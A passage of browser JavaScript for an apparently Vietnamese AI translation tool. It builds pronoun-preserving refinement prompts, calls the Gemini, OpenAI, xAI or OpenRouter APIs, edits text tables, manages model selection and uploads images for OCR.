        // Add them to the UI
        defaultExpressions.forEach(expr => {
            const newExpression = expressionTemplate.content.cloneNode(true);
            expressionsContainer.appendChild(newExpression);
            
            const valueInput = expressionsContainer.querySelector('.expression-entry:last-child .expression-value');
            valueInput.value = expr;
            
            const removeBtn = expressionsContainer.querySelector('.expression-entry:last-child .remove-btn');
            removeBtn.addEventListener('click', function() {
                this.closest('.expression-entry').remove();
                updateExpressionsData();
                markAsChanged();
            });
            
            valueInput.addEventListener('input', function() {
                updateExpressionsData();
                markAsChanged();
            });
        });
        
        updateExpressionsData();
    }
    
    // Hàm lấy văn bản gốc cần dịch
    function getOriginalText() {
        // Nếu có dữ liệu trong bảng văn bản, sử dụng nó
        if (textTableBody.children.length > 0) {
            return Array.from(textTableBody.querySelectorAll('tr')).map(row => {
                const textCell = row.querySelector('td:nth-child(4)');
                return textCell.getAttribute('data-original-text') || textCell.textContent;
            }).join('\n');
        }
        
        // Ngược lại, sử dụng văn bản từ ô nhập liệu
        return sourceTextInput.value.trim();
    }
    
    // Hàm hiển thị thông báo lỗi
    function displayErrorMessage(message) {
        showToast(message, 'error');
        
        // Hiển thị thông báo lỗi trong kết quả dịch
        const errorElement = document.createElement('div');
        errorElement.className = 'error-message';
        errorElement.textContent = message;
        
        translationResult.innerHTML = '';
        translationResult.appendChild(errorElement);
        
        console.error(message);
    }
    
    // Hàm gọi API ChatGPT
    async function callChatGPT(apiKey, model, prompt) {
        try {
            // Xác định nhà cung cấp API dựa trên model
            const selectedModel = availableModels.find(m => m.id === model);
            if (!selectedModel) {
                throw new Error("Không tìm thấy thông tin về model đã chọn");
            }
            
            const provider = selectedModel.provider;
            
            // Xây dựng URL API dựa trên nhà cung cấp
            let API_URL;
            let payload;
            let headers = {
                'Content-Type': 'application/json'
            };
            
            switch(provider) {
                case 'gemini':
                    API_URL = `${API_ENDPOINTS.gemini}/models/${model}:generateContent?key=${apiKey}`;
                    payload = {
                        contents: [
                            {
                                role: "user",
                                parts: [
                                    {
                                        text: prompt
                                    }
                                ]
                            }
                        ],
                        generationConfig: {
                            temperature: 0.7,
                            topK: 64,
                            topP: 0.95,
                            maxOutputTokens: 65536,
                            responseMimeType: "text/plain"
                        }
                    };
                    break;
                    
                case 'openai':
                    API_URL = `${API_ENDPOINTS.openai}/chat/completions`;
                    payload = {
                        model: model,
                        messages: [
                            {
                                role: "user",
                                content: prompt
                            }
                        ],
                        temperature: 0.7,
                        max_tokens: 4000
                    };
                    headers['Authorization'] = `Bearer ${apiKey}`;
                    break;
                    
                case 'xai':
                    API_URL = `${API_ENDPOINTS.xai}/chat/completions`;
                    payload = {
                        model: model,
                        messages: [
                            {
                                role: "user",
                                content: prompt
                            }
                        ],
                        temperature: 0.7,
                        max_tokens: 4000
                    };
                    headers['Authorization'] = `Bearer ${apiKey}`;
                    break;
                    
                case 'openrouter':
                    API_URL = `${API_ENDPOINTS.openrouter}/chat/completions`;
                    payload = {
                        model: model,
                        messages: [
                            {
                                role: "user",
                                content: prompt
                            }
                        ],
                        temperature: 0.7,
                        max_tokens: 4000
                    };
                    headers['Authorization'] = `Bearer ${apiKey}`;
                    headers['HTTP-Referer'] = window.location.origin;
                    break;
                    
                default:
                    throw new Error(`Nhà cung cấp ${provider} không được hỗ trợ`);
            }
            
            console.log(`Đang gửi yêu cầu dịch tới API ${provider.toUpperCase()}...`);
            
            const response = await fetch(API_URL, {
                method: 'POST',
                headers: headers,
                body: JSON.stringify(payload)
            });
            
            if (!response.ok) {
                const errorText = await response.text();
                throw new Error(`Lỗi API (${response.status}): ${errorText}`);
            }
            
            const data = await response.json();
            
            // Trích xuất văn bản từ cấu trúc phản hồi dựa trên nhà cung cấp
            let result = '';
            
            switch(provider) {
                case 'gemini':
                    if (data.candidates && data.candidates.length > 0 && 
                        data.candidates[0].content && 
                        data.candidates[0].content.parts && 
                        data.candidates[0].content.parts.length > 0) {
                        result = data.candidates[0].content.parts[0].text;
                    }
                    break;
                    
                case 'openai':
                case 'xai':
                case 'openrouter':
                    if (data.choices && data.choices.length > 0 && 
                        data.choices[0].message && 
                        data.choices[0].message.content) {
                        result = data.choices[0].message.content;
                    }
                    break;
            }
            
            if (!result) {
                console.error("Cấu trúc phản hồi không đúng:", data);
                throw new Error("Không thể trích xuất kết quả từ phản hồi API");
            }
            
            return result;
        } catch (error) {
            console.error("Lỗi khi gọi API:", error);
            throw error;
        }
    }
    
    // Cập nhật trạng thái nút dịch
    function updateButtonState() {
        translateBtn.disabled = isLoading;
        refineAgainBtn.disabled = isLoading || !translationResult.textContent.trim();
        copyTextBtn.disabled = isLoading || !translationResult.textContent.trim();
        
        if (isLoading) {
            translateBtn.textContent = 'Đang dịch...';
            refineAgainBtn.innerHTML = '<i class="fas fa-spinner fa-spin"></i> Đang trau chuốt...';
            loadingIndicator.style.display = 'block';
            copyTextBtn.style.opacity = '0.5';
            copyTextBtn.style.cursor = 'not-allowed';
        } else {
            translateBtn.textContent = 'Dịch văn bản';
            refineAgainBtn.innerHTML = '<i class="fas fa-magic"></i> Trau chuốt lần nữa';
            loadingIndicator.style.display = 'none';
            copyTextBtn.style.opacity = translationResult.textContent.trim() ? '1' : '0.5';
            copyTextBtn.style.cursor = translationResult.textContent.trim() ? 'pointer' : 'not-allowed';
        }
    }

    async function refineAgain() {
        // Kiểm tra nếu không có kết quả dịch hoặc đang trong quá trình xử lý
        if (isLoading || !translationResult.textContent.trim()) {
            displayErrorMessage('Không có kết quả dịch để trau chuốt thêm.');
            return;
        }

        // Hiển thị tiến trình
        const progressElement = document.createElement('div');
        progressElement.className = 'translation-progress';
        progressElement.innerHTML = `
            <div class="progress-step step-active">Trau chuốt bản dịch thêm một lần nữa</div>
        `;
        
        // Lưu lại nội dung kết quả dịch hiện tại
        const currentTranslation = translationResult.textContent;
        
        // Xóa nội dung hiện tại và hiển thị tiến trình
        translationResult.innerHTML = '';
        translationResult.appendChild(progressElement);

        const apiKey = document.getElementById('api-key').value.trim();
        if (!apiKey) {
            displayErrorMessage('Vui lòng nhập API key.');
            return;
        }

        // Lấy model được chọn từ dropdown
        const model = document.getElementById('model-selection').value;
        if (!model) {
            displayErrorMessage('Vui lòng chọn model AI.');
            return;
        }
        
        // Trích xuất thông tin quan trọng từ dữ liệu nhập vào
        const promptInfo = extractPromptInfo();
        
        isLoading = true;
        updateButtonState();

        // Chuẩn bị prompt cho việc trau chuốt lần nữa
        let additionalRefinementPrompt = buildAdditionalRefinementPrompt(currentTranslation, promptInfo);
        
        // Gọi API để trau chuốt lần nữa
        try {
            const additionalRefinedTranslation = await callChatGPT(apiKey, model, additionalRefinementPrompt);
            
            // Loại bỏ mọi định dạng Markdown và thông tin nhân vật, biểu hiện ở kết quả cuối cùng
            const finalTranslation = stripMarkdown(additionalRefinedTranslation);
            
            // Hiển thị kết quả
            translationResult.innerHTML = '';
            translationResult.appendChild(document.createTextNode(finalTranslation));
            
            // Hiển thị nút trau chuốt lần nữa khi có kết quả dịch
            document.getElementById('refine-again-controls').style.display = 'flex';
            
            isLoading = false;
            updateButtonState();
        } catch (error) {
            displayErrorMessage('Lỗi trau chuốt văn bản: ' + error.message);
            isLoading = false;
            updateButtonState();
        }
    }
    
    // Hàm tạo prompt cho việc trau chuốt thêm lần nữa
    function buildAdditionalRefinementPrompt(currentTranslation, promptInfo) {
        let prompt = "Dưới đây là bản dịch đã được trau chuốt một lần. Hãy tiếp tục trau chuốt thêm một lần nữa để có văn phong tự nhiên hơn, mượt mà hơn như đối thoại ngoài đời, nhưng không được thêm bớt nội dung, phải đúng ý nghĩa câu văn và TUYỆT ĐỐI PHẢI GIỮ NGUYÊN XƯNG HÔ theo yêu cầu. LƯU Ý: VIỆC GIỮ NGUYÊN XƯNG HÔ LÀ QUAN TRỌNG NHẤT, KHÔNG ĐƯỢC THAY ĐỔI DƯỚI BẤT KỲ HÌNH THỨC NÀO.\n\n";
        
        prompt += "XƯNG HÔ GIỮA CÁC NHÂN VẬT (PHẢI TUÂN THEO NGHIÊM NGẶT - ĐÂY LÀ YÊU CẦU QUAN TRỌNG NHẤT):\n";
        promptInfo.pronouns.forEach(item => {
            prompt += `- ${item.from}: gọi ${item.to} là "${item.value}"`;
            if (item.selfValue) {
                prompt += `, xưng bản thân là "${item.selfValue}"`;
            }
            prompt += '\n';
        });
        
        if (promptInfo.relationships.length > 0) {
            prompt += "\nMỐI QUAN HỆ GIỮA CÁC NHÂN VẬT:\n";
            promptInfo.relationships.forEach(rel => {
                prompt += `- ${rel}\n`;
            });
        }
        
        prompt += "\nYÊU CẦU BẮT BUỘC PHẢI TUÂN THỦ:\n";
        prompt += "- Nâng cao văn phong để tự nhiên hơn, dễ đọc hơn\n";
        prompt += "- Tạo cảm xúc phù hợp với ngữ cảnh nhưng không làm thay đổi ý nghĩa\n";
        prompt += "- TUYỆT ĐỐI GIỮ NGUYÊN TẤT CẢ XƯNG HÔ giữa các nhân vật như đã chỉ định ở trên\n";
        prompt += "- Giữ nguyên cấu trúc đoạn văn và phân đoạn\n";
        prompt += "- Không sử dụng Markdown, trả về văn bản thuần túy\n";
        prompt += "- Không thêm bất kỳ thông tin mới nào\n";
        prompt += "- VÔ CÙNG QUAN TRỌNG: PHẢI GIỮ NGUYÊN định dạng đầu vào 'Nhân vật: X, Biểu hiện/dạng thoại: Y, câu cần trau chuốt: Z' ở mỗi dòng trong QUÁ TRÌNH trau chuốt, nhưng KHÔNG đưa thông tin này vào kết quả cuối cùng\n";
        
        // Thêm văn phong nếu có
        if (promptInfo.style) {
            prompt += `- Áp dụng văn phong: ${promptInfo.style}\n`;
        }
        
        // Thêm thể loại nếu có
        if (promptInfo.genre) {
            prompt += `- Phù hợp với thể loại: ${promptInfo.genre}\n`;
        }
        
        // Thêm thông tin về các dòng cần giữ nguyên
        if (promptInfo.keepOriginalLines.length > 0) {
            prompt += "\nCÁC DÒNG VĂN BẢN CẦN GIỮ NGUYÊN (KHÔNG ĐƯỢC THAY ĐỔI):\n";
            promptInfo.keepOriginalLines.forEach(line => {
                prompt += `Dòng ${line.index}: ${line.text}\n`;
            });
            prompt += "Những dòng trên PHẢI được giữ nguyên trong bản dịch cuối cùng, KHÔNG ĐƯỢC DỊCH các dòng này.\n";
        }
        
        // Xử lý trích xuất thông tin nhân vật và biểu hiện/dạng thoại từ văn bản hiện tại
        const processedTranslation = prepareTranslationForRefinement(currentTranslation);
        
        prompt += "\nBẢN DỊCH CẦN TRAU CHUỐT THÊM:\n\n";
        prompt += processedTranslation;
        
        prompt += "\n\nCÁCH TRẢ LỜI YÊU CẦU: Sau khi trau chuốt, hãy chỉ trả về kết quả trau chuốt THEO ĐÚNG ĐỊNH DẠNG CHUẨN SAU:\n";
        prompt += "1. Mỗi dòng phải bắt đầu với 'Nhân vật: X, Biểu hiện/dạng thoại: Y, câu cần trau chuốt: Z'\n";
        prompt += "2. TUYỆT ĐỐI KHÔNG thêm mô tả, giải thích hoặc bất kỳ phần giới thiệu/kết luận nào\n";
        prompt += "3. Không thêm bất kỳ định dạng Markdown nào\n";
        prompt += "4. Trả về kết quả dưới dạng văn bản thuần (plain text)\n\n";
        
        prompt += "NHẮC LẠI CÁC QUY TẮC TRAU CHUỐT (ĐỌC KỸ VÀ TUÂN THỦ):\n";
        prompt += "1. PHẢI giữ nguyên cấu trúc đoạn văn và phân đoạn\n";
        prompt += "2. PHẢI sử dụng CHÍNH XÁC xưng hô giữa các nhân vật như đã chỉ định ở trên - ĐÂY LÀ QUAN TRỌNG NHẤT\n";
        prompt += "3. PHẢI giữ nguyên những dòng đã được chỉ định là 'giữ nguyên'\n";
        prompt += "4. PHẢI giữ nguyên định dạng 'Nhân vật: X, Biểu hiện/dạng thoại: Y, câu cần trau chuốt: Z' ở mỗi dòng trong kết quả trau chuốt\n";
        prompt += "5. KHÔNG được thêm phần giới thiệu hoặc kết luận nào vào kết quả";
        
        return prompt;
    }
    
    // Hàm chuẩn bị văn bản cho việc trau chuốt lần nữa với thông tin nhân vật và biểu hiện
    function prepareTranslationForRefinement(currentTranslation) {
        // Phân tách văn bản thành các dòng
        const lines = currentTranslation.split('\n');
        
        // Lấy thông tin nhân vật và biểu hiện từ bảng văn bản gốc
        const tableRows = document.querySelectorAll('#text-table-body tr');
        
        // Xử lý từng dòng
        const processedLines = lines.map((line, index) => {
            // Nếu dòng rỗng, giữ nguyên
            if (!line.trim()) return line;
            
            // Nếu còn dòng tương ứng trong bảng, lấy thông tin từ đó
            if (index < tableRows.length) {
                const row = tableRows[index];
                const characterSelect = row.querySelector('.character-select');
                const expressionSelect = row.querySelector('.expression-select');
                
                const character = characterSelect.value !== 'none' ? characterSelect.value : '';
                const expression = expressionSelect.value !== 'none' ? expressionSelect.value : '';
                
                // Tạo dòng mới với định dạng chuẩn
                let formattedLine = '';
                
                // Thêm thông tin nhân vật nếu có
                if (character) {
                    formattedLine += `Nhân vật: ${character}, `;
                }
                
                // Thêm thông tin biểu hiện nếu có
                if (expression) {
                    formattedLine += `Biểu hiện/dạng thoại: ${expression}, `;
                }
                
                // Thêm câu cần trau chuốt
                formattedLine += `câu cần trau chuốt: ${line}`;
                
                return formattedLine;
            }
            
            // Nếu không có thông tin tương ứng, chỉ thêm phần câu cần trau chuốt
            return `câu cần trau chuốt: ${line}`;
        });
        
        return processedLines.join('\n');
    }

    // Hàm reset tất cả cài đặt
    function resetSettings() {
        // Hiển thị thông báo xác nhận
        if (!confirm('Bạn có chắc chắn muốn xóa tất cả cài đặt? Thao tác này không thể hoàn tác.')) {
            return;
        }
        
        // Reset nhân vật
        characterContainer.innerHTML = '';
        addCharacter(); // Thêm một nhân vật trống
        
        // Reset mối quan hệ
        relationshipContainer.innerHTML = '';
        
        // Reset xưng hô
        pronounContainer.innerHTML = '';
        
        // Reset biểu hiện - nhưng giữ lại các biểu hiện mặc định
        const keepExpressions = ['Giữ nguyên', 'Vui vẻ', 'Buồn bã', 'Tức giận', 'Suy nghĩ', 
            'Hét lớn', 'Khóc lóc', 'Cười nhẹ', 'Nghiêm túc'];
            
        expressionsContainer.innerHTML = '';
        keepExpressions.forEach(expr => {
            const newExpression = expressionTemplate.content.cloneNode(true);
            expressionsContainer.appendChild(newExpression);
            
            const valueInput = expressionsContainer.querySelector('.expression-entry:last-child .expression-value');
            valueInput.value = expr;
            
            const removeBtn = expressionsContainer.querySelector('.expression-entry:last-child .remove-btn');
            removeBtn.addEventListener('click', function() {
                this.closest('.expression-entry').remove();
                updateExpressionsData();
                markAsChanged();
            });
            
            valueInput.addEventListener('input', function() {
                updateExpressionsData();
                markAsChanged();
            });
        });
        
        // Reset các trường nhập liệu
        contextInput.value = '';
        genreInput.value = '';
        styleInput.value = '';
        requirementsInput.value = 'dịch phải đúng xưng hô, trau chuốt thật kỹ, văn phong phải hay, tránh lỗi lặp từ';
        sourceTextInput.value = '';
        
        // Reset bảng văn bản và textLines
        textTableBody.innerHTML = '';
        textLines = [];
        
        // Reset kết quả dịch
        translationResult.innerHTML = '';
        
        // Cập nhật danh sách nhân vật và biểu hiện
        updateCharactersList();
        updateExpressionsData();
        
        // Cập nhật trạng thái nút
        updateButtonState();
        
        // Xóa dữ liệu từ localStorage
        localStorage.removeItem('dich-ai-settings');
        
        // Đánh dấu là đã thay đổi
        hasUnsavedChanges = true;
        
        // Thông báo đã reset thành công
        showToast('Đã reset tất cả cài đặt về mặc định.', 'success');
    }

    // Hàm làm cho ô văn bản có thể chỉnh sửa
    function makeTextEditable(cell) {
        // Tạo một textarea để thay thế ô hiện tại
        const textarea = document.createElement('textarea');
        textarea.value = cell.textContent;
        textarea.className = 'inline-edit-textarea';
        textarea.rows = Math.max(2, cell.textContent.split('\n').length);
        
        // Thay thế nội dung ô bằng textarea
        cell.innerHTML = '';
        cell.appendChild(textarea);
        
        // Focus vào textarea
        textarea.focus();
        
        // Lưu thay đổi khi bấm Enter hoặc rời khỏi textarea
        textarea.addEventListener('blur', function() {
            saveTextEdit(cell, textarea);
        });
        
        textarea.addEventListener('keydown', function(e) {
            if (e.key === 'Enter' && !e.shiftKey) {
                e.preventDefault();
                this.blur();
            }
        });
    }
    
    // Lưu thay đổi sau khi chỉnh sửa văn bản
    function saveTextEdit(cell, textarea) {
        const newText = textarea.value.trim();
        const row = cell.parentNode;
        
        // Lưu lại các phần tử hành động (nếu có)
        const actionSpan = cell.querySelector('.table-row-actions');
        
        // Cập nhật nội dung ô và thuộc tính data-original-text
        cell.textContent = newText;
        cell.setAttribute('data-original-text', newText);
        
        // Khôi phục các nút hành động nếu đã có trước đó
        if (actionSpan) {
            cell.appendChild(actionSpan);
        } else {
            // Nếu chưa có các nút hành động, tạo mới
            const rowIndex = row.rowIndex - 1; // Trừ 1 vì hàng đầu tiên là header
            
            // Thêm lại các nút hành động
            const newActionSpan = document.createElement('span');
            newActionSpan.className = 'table-row-actions';
            
            // Nút xóa dòng
            const deleteBtn = document.createElement('button');
            deleteBtn.type = 'button';
            deleteBtn.className = 'action-btn delete-row-btn';
            deleteBtn.innerHTML = '<i class="fas fa-trash-alt"></i>';
            deleteBtn.title = 'Xóa dòng này';
            deleteBtn.addEventListener('click', function() {
                // Sử dụng vị trí thực tế của dòng trong bảng
                const currentRowIndex = Array.from(textTableBody.querySelectorAll('tr')).indexOf(row);
                deleteTextRow(row, currentRowIndex);
            });
            
            newActionSpan.appendChild(deleteBtn);
            cell.appendChild(newActionSpan);
            
            // Cập nhật lại các nút di chuyển
            updateMoveButtons();
        }
        
        // Cập nhật mảng textLines
        const rowIndex = row.rowIndex - 1; // Trừ 1 vì hàng đầu tiên là header
        if (rowIndex >= 0 && rowIndex < textLines.length) {
            textLines[rowIndex] = newText;
            
            // Cập nhật textarea chứa toàn bộ nội dung
            sourceTextInput.value = textLines.join('\n');
            
            // Đánh dấu đã thay đổi
            markAsChanged();
        }
    }
    
    // Thêm nút để thêm dòng mới
    function addNewRowButton() {
        const controlsDiv = document.createElement('div');
        controlsDiv.className = 'table-controls table-controls-bottom';
        
        const addRowBtn = document.createElement('button');
        addRowBtn.type = 'button';
        addRowBtn.className = 'btn btn-add';
        addRowBtn.innerHTML = '<i class="fas fa-plus"></i> Thêm dòng mới';
        addRowBtn.addEventListener('click', addNewTextRow);
        
        controlsDiv.appendChild(addRowBtn);
        
        // Thêm nút sau bảng thay vì trước bảng
        const tableContainer = document.querySelector('.table-container');
        tableContainer.parentNode.insertBefore(controlsDiv, tableContainer.nextSibling);
    }

    // Hàm thêm phần chọn model vào giao diện
    function addModelSelection() {
        // Tạo container cho phần chọn nhà cung cấp API
        const providerSection = document.createElement('div');
        providerSection.className = 'settings-section';
        
        // Tạo tiêu đề
        const providerTitle = document.createElement('h3');
        providerTitle.innerHTML = '<i class="fas fa-server"></i> Chọn nhà cung cấp API';
        providerSection.appendChild(providerTitle);
        
        // Tạo dropdown chọn nhà cung cấp
        const providerContainer = document.createElement('div');
        providerContainer.className = 'provider-selection-container';
        
        const providerSelect = document.createElement('select');
        providerSelect.id = 'api-provider';
        providerSelect.className = 'full-width';
        
        // Thêm các tùy chọn nhà cung cấp
        const providers = [
            { id: 'gemini', name: 'Google Gemini', description: 'API của Google Gemini' },
            { id: 'openai', name: 'OpenAI', description: 'API của OpenAI (GPT-3.5, GPT-4)' },
            { id: 'xai', name: 'X.AI', description: 'API của X.AI' },
            { id: 'openrouter', name: 'OpenRouter', description: 'API tổng hợp nhiều model AI' }
        ];
        
        providers.forEach(provider => {
            const option = document.createElement('option');
            option.value = provider.id;
            option.textContent = `${provider.name} - ${provider.description}`;
            providerSelect.appendChild(option);
        });
        
        // Chọn nhà cung cấp mặc định
        providerSelect.value = "gemini";
        
        providerContainer.appendChild(providerSelect);
        providerSection.appendChild(providerContainer);
        
        // Thêm mô tả
        const providerDescription = document.createElement('p');
        providerDescription.className = 'provider-description';
        providerDescription.textContent = 'Chọn nhà cung cấp API phù hợp với API key của bạn.';
        providerSection.appendChild(providerDescription);
        
        // Tạo container cho phần chọn model
        const modelSection = document.createElement('div');
        modelSection.className = 'settings-section';
        
        // Tạo tiêu đề
        const title = document.createElement('h3');
        title.innerHTML = '<i class="fas fa-brain"></i> Chọn model AI';
        modelSection.appendChild(title);
        
        // Tạo dropdown chọn model
        const selectContainer = document.createElement('div');
        selectContainer.className = 'model-selection-container';
        
        const select = document.createElement('select');
        select.id = 'model-selection';
        select.className = 'full-width';
        
        // Thêm các tùy chọn model của nhà cung cấp mặc định (Gemini)
        updateModelOptions('gemini', select);
        
        selectContainer.appendChild(select);
        modelSection.appendChild(selectContainer);
        
        // Thêm phần nhập model tùy chỉnh cho OpenRouter
        const customModelContainer = document.createElement('div');
        customModelContainer.id = 'custom-model-container';
        customModelContainer.className = 'custom-model-container';
        customModelContainer.style.display = 'none'; // Ẩn ban đầu
        
        const customModelInput = document.createElement('input');
        customModelInput.type = 'text';
        customModelInput.id = 'custom-model-input';
        customModelInput.className = 'custom-model-input';
        customModelInput.placeholder = 'Nhập tên model của OpenRouter (ví dụ: anthropic/claude-3-haiku)';
        
        const customModelButton = document.createElement('button');
        customModelButton.type = 'button';
        customModelButton.id = 'add-custom-model';
        customModelButton.className = 'btn btn-secondary btn-small';
        customModelButton.textContent = 'Thêm model';
        customModelButton.addEventListener('click', function() {
            addCustomModel();
        });
        
        // Thêm mô tả cho phần nhập model tùy chỉnh
        const customModelDescription = document.createElement('p');
        customModelDescription.className = 'custom-model-description';
        customModelDescription.innerHTML = 'Nhập tên model của <a href="https://openrouter.ai/docs#models" target="_blank">OpenRouter</a> và nhấn "Thêm model" để sử dụng.';
        
        customModelContainer.appendChild(customModelInput);
        customModelContainer.appendChild(customModelButton);
        customModelContainer.appendChild(customModelDescription);
        
        modelSection.appendChild(customModelContainer);
        
        // Thêm mô tả
        const description = document.createElement('p');
        description.className = 'model-description';
        description.textContent = 'Chọn model AI phù hợp với nhu cầu của bạn.';
        modelSection.appendChild(description);
        
        // Thêm vào giao diện, sau phần API key
        const apiKeySection = document.querySelector('.api-key-section');
        apiKeySection.parentNode.insertBefore(providerSection, apiKeySection.nextSibling);
        apiKeySection.parentNode.insertBefore(modelSection, providerSection.nextSibling);
        
        // Thêm sự kiện khi thay đổi model
        select.addEventListener('change', function() {
            markAsChanged();
        });
        
        // Thêm sự kiện khi thay đổi nhà cung cấp
        providerSelect.addEventListener('change', function() {
            updateModelOptions(this.value, select);
            markAsChanged();
            
            // Cập nhật placeholder cho API key
            const apiKeyInput = document.getElementById('api-key');
            const apiKeyContainer = document.querySelector('.api-key-container');
            const apiKeyIntro = document.querySelector('.api-key-intro');
            const provider = this.value;
            
            switch(provider) {
                case 'gemini':
                    apiKeyInput.placeholder = 'Nhập API key của Google Gemini (AIzaSyC...)';
                    apiKeyIntro.innerHTML = 'Để sử dụng ứng dụng, bạn cần nhập API key từ <a href="https://makersuite.google.com/app/apikey" target="_blank">Google Gemini</a>';
                    break;
                case 'openai':
                    apiKeyInput.placeholder = 'Nhập API key của OpenAI (sk-...)';
                    apiKeyIntro.innerHTML = 'Để sử dụng ứng dụng, bạn cần nhập API key từ <a href="https://platform.openai.com/api-keys" target="_blank">OpenAI</a>';
                    break;
                case 'xai':
                    apiKeyInput.placeholder = 'Nhập API key của X.AI';
                    apiKeyIntro.innerHTML = 'Để sử dụng ứng dụng, bạn cần nhập API key từ X.AI';
                    break;
                case 'openrouter':
                    apiKeyInput.placeholder = 'Nhập API key của OpenRouter';
                    apiKeyIntro.innerHTML = 'Để sử dụng ứng dụng, bạn cần nhập API key từ <a href="https://openrouter.ai/keys" target="_blank">OpenRouter</a>';
                    break;
            }
        });
    }

    // Hàm cập nhật danh sách model dựa trên nhà cung cấp
    function updateModelOptions(provider, selectElement) {
        const select = selectElement || document.getElementById('model-selection');
        
        if (!select) return;
        
        // Lưu lại model đã chọn
        const currentValue = select.value;
        
        // Xóa tất cả tùy chọn hiện tại
        select.innerHTML = '';
        
        // Lọc và thêm các model phù hợp với nhà cung cấp
        const filteredModels = availableModels.filter(model => model.provider === provider);
        
        filteredModels.forEach(model => {
            const option = document.createElement('option');
            option.value = model.id;
            option.textContent = `${model.name} - ${model.description}`;
            select.appendChild(option);
        });
        
        // Hiển thị hoặc ẩn phần nhập model tùy chỉnh
        const customModelContainer = document.getElementById('custom-model-container');
        if (customModelContainer) {
            if (provider === 'openrouter') {
                customModelContainer.style.display = 'block';
            } else {
                customModelContainer.style.display = 'none';
            }
        }
        
        // Khôi phục model đã chọn nếu vẫn có trong danh sách mới
        if (currentValue && Array.from(select.options).some(opt => opt.value === currentValue)) {
            select.value = currentValue;
        } else if (select.options.length > 0) {
            select.selectedIndex = 0; // Chọn model đầu tiên nếu không tìm thấy model cũ
        }
    }

    // Hàm thêm model tùy chỉnh
    function addCustomModel() {
        const customModelInput = document.getElementById('custom-model-input');
        const modelSelect = document.getElementById('model-selection');
        
        if (!customModelInput || !modelSelect) return;
        
        const modelName = customModelInput.value.trim();
        
        if (!modelName) {
            showToast('Vui lòng nhập tên model!', 'error');
            return;
        }
        
        // Kiểm tra xem model đã tồn tại trong danh sách chưa
        const existingModel = availableModels.find(m => m.id === modelName && m.provider === 'openrouter');
        
        if (existingModel) {
            showToast('Model này đã tồn tại trong danh sách!', 'warning');
            return;
        }
        
        // Thêm model mới vào danh sách
        const newModel = {
            id: modelName,
            name: modelName,
            description: "Model tùy chỉnh của OpenRouter",
            provider: "openrouter"
        };
        
        availableModels.push(newModel);
        
        // Cập nhật danh sách model
        updateModelOptions('openrouter', modelSelect);
        
        // Chọn model mới thêm
        modelSelect.value = modelName;
        
        // Xóa nội dung input
        customModelInput.value = '';
        
        // Thông báo thành công
        showToast('Đã thêm model thành công!', 'success');
        
        // Đánh dấu đã thay đổi
        markAsChanged();
    }

    // OCR Extractor Functionality
    function initOCR() {
        const dropzone = document.getElementById('dropzone');
        const fileInput = document.getElementById('fileInput');
        const preview = document.getElementById('preview');
        const extractBtn = document.getElementById('extract-btn');
        const loadingIndicator = document.getElementById('ocr-loading-indicator');
        const resultElement = document.getElementById('ocr-result');
        const downloadBtn = document.getElementById('download-ocr-btn');
        const languageSelect = document.getElementById('ocr-language');
        
        if (!dropzone) return; // Thoát nếu không tìm thấy các element
        
        let downloadUrl = null;
        
        // Xử lý kéo thả hình ảnh
        dropzone.addEventListener('dragover', function(e) {
            e.preventDefault();
            dropzone.classList.add('highlight');
        });
        
        dropzone.addEventListener('dragleave', function() {
            dropzone.classList.remove('highlight');
        });
        
        dropzone.addEventListener('drop', function(e) {
            e.preventDefault();
            dropzone.classList.remove('highlight');
            
            const file = e.dataTransfer.files[0];
            if (file && file.type.match('image.*')) {
                handleFile(file);
            } else {
                showToast('Vui lòng chọn file hình ảnh hợp lệ (jpg, png, gif, webp)', 'error');
            }
        });
        
        dropzone.addEventListener('click', function() {
            fileInput.click();
        });
        
        fileInput.addEventListener('change', function() {
            if (fileInput.files.length > 0) {
                const file = fileInput.files[0];
                if (file.type.match('image.*')) {
                    handleFile(file);
                } else {
                    showToast('Vui lòng chọn file hình ảnh hợp lệ (jpg, png, gif, webp)', 'error');
                    fileInput.value = ''; // Reset input
                }
            }
        });
        
        function handleFile(file) {
            // Giới hạn kích thước file (10MB)
            const maxSizeBytes = 10 * 1024 * 1024;
            if (file.size > maxSizeBytes) {
                showToast(`File quá lớn. Vui lòng chọn file nhỏ hơn 10MB`, 'error');
                return;
            }
            
            const reader = new FileReader();
            
            reader.onload = function(e) {
                preview.src = e.target.result;
                preview.style.display = 'block';
            };
            
            reader.onerror = function() {
                showToast('Lỗi khi đọc file', 'error');
            };
            
            reader.readAsDataURL(file);
        }
        
        // Xử lý submit form
        extractBtn.addEventListener('click', function() {
            if (!fileInput.files.length) {
                showToast('Vui lòng chọn hình ảnh trước!', 'error');
                return;
            }
            
            const file = fileInput.files[0];
            const language = languageSelect.value;
            
            // Kiểm tra lại kích thước file
            const maxSizeBytes = 10 * 1024 * 1024;
            if (file.size > maxSizeBytes) {
                showToast(`File quá lớn. Vui lòng chọn file nhỏ hơn 10MB`, 'error');
                return;
            }
            
            // Hiển thị loader
            loadingIndicator.style.display = 'block';
            resultElement.textContent = '';
            downloadBtn.style.display = 'none';
            extractBtn.disabled = true;
            
            // Tạo FormData
            const formData = new FormData();
            formData.append('image', file);
            formData.append('language', language);
            
            // Gửi request đến API
            fetch('/api/ocr', {
                method: 'POST',
                body: formData
            })
            .then(response => {
                if (!response.ok) {
                    return response.json().then(errorData => {
                        throw new Error(errorData.error || `HTTP error! Status: ${response.status}`);
                    });
                }
                return response.json();
            })
            .then(data => {
                // Ẩn loader
                loadingIndicator.style.display = 'none';
                extractBtn.disabled = false;
                
                if (data.error) {
                    showToast('Lỗi: ' + data.error, 'error');
                    return;
                }
                
                // Hiển thị kết quả
                resultElement.textContent = data.transcript || 'Không có văn bản được trích xuất';
                
                if (data.transcript && data.transcript.trim()) {
                    downloadBtn.style.display = 'block';
                    // Lưu URL download
                    downloadUrl = data.download_url;
                    showToast('Trích xuất OCR thành công!', 'success');
                } else {
                    showToast('Không phát hiện văn bản trong hình ảnh', 'info');
                }
            })
            .catch(error => {
                loadingIndicator.style.display = 'none';
                extractBtn.disabled = false;
                showToast('Lỗi: ' + error.message, 'error');
                console.error('OCR error:', error);
            });
        });
        
        // Xử lý tải file về máy
        downloadBtn.addEventListener('click', function() {
            if (downloadUrl) {
                window.location.href = downloadUrl;
            } else {
                showToast('Không có dữ liệu để tải xuống', 'error');
            }
        });
    }

    // Thêm chức năng lưu và tải API key
    function setupApiKeySaving() {
        const apiKeyInput = document.getElementById('api-key');
        
        if (!apiKeyInput) return; // Thoát nếu không tìm thấy input API key
        
        // Khôi phục API key từ localStorage nếu có
        const savedApiKey = localStorage.getItem('gemini_api_key');
        if (savedApiKey) {
